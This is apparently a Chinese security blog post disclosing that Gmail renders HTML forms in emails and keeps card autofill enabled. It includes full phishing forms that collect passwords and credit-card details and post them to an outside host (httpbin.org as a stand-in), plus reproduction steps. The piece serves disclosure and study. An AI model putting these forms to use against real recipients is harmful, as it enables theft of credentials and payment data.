#  Gmail 中的 HTML 表单注入漏洞   
原创 骨哥说事  骨哥说事   2024-09-18 22:22  
  
<table><tbody><tr><td width="557" valign="top" style="word-break: break-all;"><h1 data-selectable-paragraph="" style="white-space: normal;outline: 0px;max-width: 100%;font-family: -apple-system, system-ui, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;overflow-wrap: break-word !important;"><strong style="outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="color: rgb(255, 0, 0);"><strong><span style="font-size: 15px;">声明：</span></strong></span><span style="font-size: 15px;"></span></span></strong><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="font-size: 15px;">文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</span></span></h1></td></tr></tbody></table>#   
# 博客新域名：https://gugesay.com  
  
******不想错过任何消息？设置星标****↓ ↓ ↓**  
****  
#   
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlbXyV4tJfwXpicwdZ2gTB6XtwoqRvbaCy3UgU1Upgn094oibelRBGyMs5GgicFKNkW1f62QPCwGwKxA/640?wx_fmt=png&from=appmsg "")  
  
# 前言  
  
你是否知道 Gmail 允许使用<form>HTML 标记？该功能存在潜在的   
安全风险，尤其是在尝试窃取用户凭据或敏感信息时。  
  
如果攻击者尝试通过在电子邮件中嵌入 HTML 表单来捕获用户的密码，如下所示：  
```
<form action="https://httpbin.org/post" method="POST">
    <input type="email" name="email" placeholder="Email or phone" required>
    <input type="password" name="password" placeholder="Password" required>
    <input type="submit" value="Next">
</form>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jnZZl7KF9uehFAGvScGDQmGbYkJWKpruTh3NnEhIUg3Oh6guw5lXylxHqqTw6lYgGuYiagtJq9NSpA/640?wx_fmt=png&from=appmsg "")  
  
邮件收件人将看到电子邮件中呈现的表单，但是 Gmail 会显示一条警告消息“Be careful with this message（请小心此信息）”，并禁用自动填充功能，从而降低用户无意中提交凭据的可能性。  
  
利用信用卡自动填充问题  
  
Gmail 不会对请求信用卡详细信息的表单采取同样严格的措施，如果攻击者发送了包含收集信用卡信息表单的电子邮件，自动填充功能默认情况下会处于启用状态。  
  
谷歌似乎将信用卡详细信息视为不如密码那么敏感，但这其实带来了重大的安全风险。  
## 重现  
1. 在 Google Chrome 中，导航至“chrome://settings/ payment”  
  
1. 在付款方式下，添加假信用卡  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jnZZl7KF9uehFAGvScGDQmG09XgWetMicFVY6pyLeZxtcU9OMTDxq4H2PewSfS2hfPFFKRGc0ic1gRg/640?wx_fmt=png&from=appmsg "")  
1. 作为攻击者，发送以下 HTML 表单：  
  
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Credit Card Payment</title>
</head>
<body>
    <div class="payment-container">
        <h2>Credit Card Payment</h2>
        <form action="https://httpbin.org/post" method="POST">
            <label for="cardholder-name">Cardholder Name</label>
            <input type="text" id="cardholder-name" name="cardholder_name" placeholder="John Doe" required>

            <label for="card-number">Card Number</label>
            <input type="number" id="card-number" name="card_number" placeholder="1234 5678 9012 3456" required>

            <label for="expiry-date">Expiration Date</label>
            <input type="text" id="expiry-date" name="expiry_date" placeholder="MM/YY" required>

            <label for="cvv">CVV</label>
            <input type="number" id="cvv" name="cvv" placeholder="123" required>

            <input type="submit" value="Pay Now">
        </form>
    </div>
</body>
</html>
```  
1. 当受害者打开电子邮件时，他们会看到表格，并且允许自动填写，从而导致他们的信用卡信息意外泄露  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jnZZl7KF9uehFAGvScGDQmGxNm3ibObWOukHG2dRZDy3micxRs8bKUXtckpIVU7oXNLxRVoibEHJ0icFg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jnZZl7KF9uehFAGvScGDQmGdzdVlx54ZYxvib75fTx7JSw8Xic8TcI5ROhGD43Vib00sowZJArfZSRRQ/640?wx_fmt=png&from=appmsg "")  
  
遗憾的是，谷歌认为这并非   
安全问题。  
  
**加入星球，随时交流：**  
  
****  
**（前50位成员）：99元/年************（后续会员定价）：128元/年******![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hZj512NN8jnMJtHJnShkTnh3vR3fmaqicPicANic6OEsobrpRjx5vG6mMTib1icuPmuG74h2bxC4eP6nMMzbs5QaSlw/640?wx_fmt=jpeg&from=appmsg "")  
**感谢阅读，如果觉得还不错的话，欢迎分享给更多喜爱的朋友～****====正文结束====**  
  
  
